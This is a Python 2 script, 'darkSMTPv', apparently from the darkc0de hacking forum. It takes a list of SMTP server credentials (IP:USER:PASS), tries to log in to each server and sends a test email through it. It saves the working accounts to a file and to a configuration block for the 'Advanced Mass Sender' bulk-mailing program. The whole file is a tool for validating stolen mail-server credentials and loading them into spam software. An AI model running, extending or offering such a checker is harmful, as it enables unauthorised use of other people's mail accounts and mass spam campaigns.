#!usr/bin/python 
#darkSMTPv.py
#SMTP Checker - using Authentication
#Coded by P47r1ck & low1z
#-----------------------------------
#... To be continued ...
#
#
#THE CODE WILL TAKE A LIST OF SMTP ACCOUNTS IN THE FOLLOWING FORMAT (IP:USER:PASS) WILL TRY TO LOGIN AND THEN SEND AN 
#EMAIL TO THE ADDRESS THAT YOU CAN CHANGE ANYTIME IN THE CODE ( look below the #Create the message at the toaddr= )[LINE 33]
#
#EVERY WORKING SMTP ACCOUNT WILL PRINTED ON THE SCREEN WITH THE FOLLOWING MESSAGE : [!] Email Sent Successfully: IP USER PASS
#
#THE CODE HAS THE FOLLOWING FEATURES.
#
#   1. IT WILL SAVE THE LIST OF WORKING SMTP ACCOUNTS TO FILE OUTPUT THAT YOU WILL CHOOSE.
#   2. YOU CAN ALSO SPECIFY THE EMAIL WHERE THE SMTP CAN SEND THE TEST EMAIL.
#   3. IT WILL MAKE A LIST OF SERVERS FOR THE AMS (ADVANCED MASS SENDER PROGRAM), SO YOU CAN INSERT MORE EASIER THE SMTP
#LIST INTO THE AMS.INI FILE FROM THE AMS PROGRAM. (LIST IS SAVED TO AMSlist.txt)
#
#
#   MORE FEATURES ARE COMING SOON!!!

import sys, smtplib, socket, time
from smtplib import SMTP 

socket.setdefaulttimeout(5)    # smtp default timeout, change number to speed up large lists

def printHelp(): 
    print '\nHow to use it ? There you go :) -- > ./darkSMTPv.py <accounts> <outputfile>'
    print '\nImportant: THE SMTP ACCOUNTS MUST BE IN THE FOLLOWING FORMAT : IP:USER:PASS\n'

# Create the message
fromaddr = "thewonderousmailmachine@wtfbbq.net"
toaddr = "youremail@account.com"
#toaddr = "someone@yahoo.com"
message = """To: %s 
From: %s 
Subject: SMTP Checker! Online!
 
Checking SMTP!!!
 
""" % (toaddr,fromaddr) 

print "\n     _            _     _____ __  __ _______ _____        " 
print "    | |          | |   / ____|  \/  |__   __|  __ \       "
print "  __| | __ _ _ __| | _| (___ | \  / |  | |  | |__) |_   __"
print " / _` |/ _` | '__| |/ /\___ \| |\/| |  | |  |  ___/\ \ / /"
print "| (_| | (_| | |  |   < ____) | |  | |  | |  | |     \ V / "
print " \__,_|\__,_|_|  |_|\_\_____/|_|  |_|  |_|  |_|      \_/  \n"
print "\n This is not stopping here! ... To be continued."
print "More features will be added soon. For bugs p47r1ckro[at]gmail[dot]com\n"
print "_______________________________________________________________________"


def timer():
        now = time.localtime(time.time())
        return time.asctime(now)

def sendchk(listindex, host, user, password):   # seperated function for checking
	try:
		smtp = smtplib.SMTP(host)
		smtp.login(user, password)
		code = smtp.ehlo()[0]
		if not (200 <= code <= 299):
			code = smtp.helo()[0]
			if not (200 <= code <= 299):
				raise SMTPHeloError(code, resp)
		smtp.sendmail(fromaddr, toaddr, message)
		print "\n\t[!] Email Sent Successfully:",host, user, password
		print "\t[!] Message Sent Successfully\n"
		LSstring = host+":"+user+":"+password+"\n"
		nList.append(LSstring)		# special list for AMS file ID's
		LFile = open(output, "a")
		LFile.write(LSstring) 		# save working host/usr/pass to file
		LFile.close()
		AMSout = open("AMSlist.txt", "a")
		AMSout.write("[Server"+str(nList.index(LSstring))+"]\nName="+str(host)+"\nPort=25\nUserID=User\nBccSize=50\nUserName="+str(user)+"\nPassword="+str(password)+"\nAuthType=0\n\n")
		smtp.quit()
	except(socket.gaierror, socket.error, socket.herror, smtplib.SMTPException), msg:
		print "[-] Login Failed:", host, user, password
		pass

if len(sys.argv) != 3: 
    printHelp() 
    exit(1) 

# Do not change anything below. 
accounts = sys.argv[1]
output = sys.argv[2]

try: 
    handle = list(open(accounts))
except: 
	print"\n[+] We were unable to open the SMTP filelist. Check again your path and try again."
	print"\n[+] Ciao...."

#listindex = 0
nList = []
for line in handle:
	try:
		host = line.split(':')[0]
		user = line.split(':')[1].replace('\n', '')
		password = line.split(':')[2].replace('\n', '')
		sendchk(handle.index(line), host, user, password)
	except:
		print '\n[+] We have found a error in your accounts list'
		print host, user
		print '\n[!] IMPORTANT: THE SMTP ACCOUNTS MUST BE IN THE FOLLOWING FORMAT : IP:USER:PASS'
		print '\n[-] Exiting....\n'
		exit(1)

print "[!] Ended at: " + timer() + ""
print "[!] You should visit forum.darkc0de.com from time to time\n"